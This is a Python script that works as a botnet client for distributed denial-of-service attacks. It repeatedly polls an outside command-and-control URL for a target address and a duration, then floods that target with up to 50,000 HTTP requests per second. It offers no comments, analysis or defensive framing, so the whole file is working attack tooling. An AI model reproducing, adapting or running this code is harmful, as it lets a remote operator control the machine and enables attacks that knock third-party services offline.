import aiohttp
import asyncio
import time
import xml.etree.ElementTree as ET

MAX_REQUESTS_PER_SECOND = 50000

async def send_request(session, url):
    try:
        async with session.get(url):
            pass
    except Exception as e:
        pass

async def get_instructions():
    api_url = 'http://nrcf.medianewsonline.com/api/index.php'
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status == 200:
                    xml_data = await response.text()
                    if xml_data:
                        try:
                            root = ET.fromstring(xml_data)
                            url = root.find('url').text
                            time_limit = int(root.find('time').text)
                            return url, time_limit
                        except ET.ParseError as e:
                            return None, None
                    else:
                        return None, None
                else:
                    return None, None
    except Exception as e:
        return None, None

async def send_requests_in_batch(url, duration):
    async with aiohttp.ClientSession() as session:
        start_time = time.time()
        end_time = start_time + duration

        while time.time() < end_time:
            tasks = [send_request(session, url) for _ in range(MAX_REQUESTS_PER_SECOND)]
            await asyncio.gather(*tasks)

            elapsed_time = time.time() - start_time
            requests_per_second = MAX_REQUESTS_PER_SECOND / elapsed_time

            if elapsed_time < 1:
                await asyncio.sleep(1 - elapsed_time)

async def main():
    while True:
        url, duration = await get_instructions()

        if url and duration:
            await send_requests_in_batch(url, duration)
        else:
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
